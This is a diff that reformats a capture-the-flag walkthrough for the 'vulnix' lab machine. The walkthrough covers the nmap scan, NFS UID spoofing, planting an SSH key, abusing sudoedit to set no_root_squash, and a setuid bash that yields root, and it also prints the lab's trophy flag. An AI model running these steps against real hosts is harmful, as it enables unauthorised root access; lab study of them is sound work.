@@ -3,8 +3,7 @@
 
 ### NMAP
 
-kali@kali:~$ nmap 192.168.1.100 -sV -sT -A
-
+kali@kali:~$ nmap 192.168.1.100 -sV -sT -A  
 >Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-10 13:44 CET  
 >Nmap scan report for vulnix.home (192.168.1.100)  
 >Host is up (0.00055s latency).  
@@ -135,18 +134,12 @@ user@vulnix:~$ cat /etc/passwd
 
 ### ACCESS TO NFS
 
-root@kali:/home/kali# groupadd vulnix -g **2008**
-
-root@kali:/home/kali# useradd vulnix -u **2008** -g **2008** -s /bin/bash
-
-root@kali:/home/kali# mkdir /home/vulnix
-
-root@kali:/home/kali# mount --source 192.168.1.100:/home/vulnix --target /home/vulnix
-
-root@kali:/home/kali# su vulnix
-
-vulnix@kali:/home/kali$ cd /home/vulnix
-
+root@kali:/home/kali# groupadd vulnix -g **2008**  
+root@kali:/home/kali# useradd vulnix -u **2008** -g **2008** -s /bin/bash  
+root@kali:/home/kali# mkdir /home/vulnix  
+root@kali:/home/kali# mount --source 192.168.1.100:/home/vulnix --target /home/vulnix  
+root@kali:/home/kali# su vulnix  
+vulnix@kali:/home/kali$ cd /home/vulnix  
 vulnix@kali:~$ ll>  
 >total 20>  
 >drwxr-x--- 2 vulnix vulnix 4096 Sep  2  2012 ./>  
@@ -159,14 +152,11 @@ vulnix@kali:~$ ll>
 
 ### GETTING SSH WITH VULNIX
 
-kali@kali:~$ ssh-keygen -t rsa
-
-kali@kali:~$ cat .ssh/id_rsa.pub 
-
+kali@kali:~$ ssh-keygen -t rsa  
+kali@kali:~$ cat .ssh/id_rsa.pub  
 >ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDT1Mw6+iVZcmCHOe9IBW7S5He5ZeBwTFNhNlNqZQ90S2GLlenYEJElGxS2LiZcjtaTi4DkeYSZlUOI+fXKb+iLLFXyHdkh53gqSwF/sD0rV8N+6HQB93XtwWf69SUm80Dw9rYTOkDhPzHhQFsUIXyErZeiX0vdcDsXEKUV+toYOmmUa/avVbz/Y9CjMTAAFxEDSzprbLAIORJ6ZjIeVn5J4xHo1+xuD3O0tQ/Jw7fhc7zTn3NGtd0JjDuRiz9T6X+eYLL6+rwMXnQXKxhGNbuBIObNHR/iNL1YZdSxH6W8gSFiHIGr42hSUV1dxEySDz8bNCZFI2etWyqbpTmfJGCP kali@kali
 
-kali@kali:~$ su vulnix
-
+kali@kali:~$ su vulnix  
 vulnix@kali:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDT1Mw6+iVZcmCHOe9IBW7S5He5ZeBwTFNhNlNqZQ90S2GLlenYEJElGxS2LiZcjtaTi4DkeYSZlUOI+fXKb+iLLFXyHdkh53gqSwF/sD0rV8N+6HQB93XtwWf69SUm80Dw9rYTOkDhPzHhQFsUIXyErZeiX0vdcDsXEKUV+toYOmmUa/avVbz/Y9CjMTAAFxEDSzprbLAIORJ6ZjIeVn5J4xHo1+xuD3O0tQ/Jw7fhc7zTn3NGtd0JjDuRiz9T6X+eYLL6+rwMXnQXKxhGNbuBIObNHR/iNL1YZdSxH6W8gSFiHIGr42hSUV1dxEySDz8bNCZFI2etWyqbpTmfJGCP kali@kali" > authorized_keys
 
 kali@kali:~$ ssh -l vulnix 192.168.1.100
@@ -174,8 +164,7 @@ kali@kali:~$ ssh -l vulnix 192.168.1.100
 
 ### PRIVILEGE ELEVATION
 
-vulnix@vulnix:~$ sudo -l
-
+vulnix@vulnix:~$ sudo -l  
 >Matching 'Defaults' entries for vulnix on this host:  
 >    env_reset,  
 >    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
@@ -183,52 +172,41 @@ vulnix@vulnix:~$ sudo -l
 >User vulnix may run the following commands on this host:  
 >    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
 
-vulnix@vulnix:~$ sudoedit /etc/exports
-
+vulnix@vulnix:~$ sudoedit /etc/exports  
 >/home/vulnix    *(rw,root_squash)  
 >/root   *(rw,**no_root_squash**) <- ADDED
 
 **Reboot!**
 
-root@kali:/home/kali# showmount -e 192.168.1.100
-
+root@kali:/home/kali# showmount -e 192.168.1.100  
 >Export list for 192.168.1.100:  
 >/root        *  
 >/home/vulnix *
 
-root@kali:/mnt# mount 192.168.1.100:/root /mnt/root
-
-root@kali:/mnt# cd /mnt/root
-
-root@kali:/mnt/root# ls -lrth
-
+root@kali:/mnt# mount 192.168.1.100:/root /mnt/root  
+root@kali:/mnt# cd /mnt/root  
+root@kali:/mnt/root# ls -lrth  
 >total 4.0K  
 >-r-------- 1 root root 33 Sep  2  2012 trophy.txt
 
-root@kali:/mnt/root# cat trophy.txt 
-
+root@kali:/mnt/root# cat trophy.txt  
 >***cc614640424f5bd60ce5d5264899c3be***
 
 
 ### GETTING ROOT SHELL
 
-vulnix@vulnix:~$ sudoedit /etc/exports
-
+vulnix@vulnix:~$ sudoedit /etc/exports  
 >/home/vulnix    *(rw,**no_root_squash**) <- MODIFIED  
 >/root   *(rw,no_root_squash)
 
 **Reboot!**
 
-vulnix@vulnix:~$ cp /bin/bash /home/vulnix
-
-root@kali:/mnt/vulnix# chmod 4777 bash 
-
+vulnix@vulnix:~$ cp /bin/bash /home/vulnix  
+root@kali:/mnt/vulnix# chmod 4777 bash   
 root@kali:/mnt/vulnix# ls -lrth
 >total 900K  
 >-rw**s**rwxrwx 1 root root 900K Mar 10 16:47 bash
 
-vulnix@vulnix:~$ ./bash -p
-
-bash-4.2# id
-
+vulnix@vulnix:~$ ./bash -p  
+bash-4.2# id  
 >uid=2008(vulnix) gid=2008(vulnix) euid=0(**root**) groups=0(**root**),2008(vulnix)
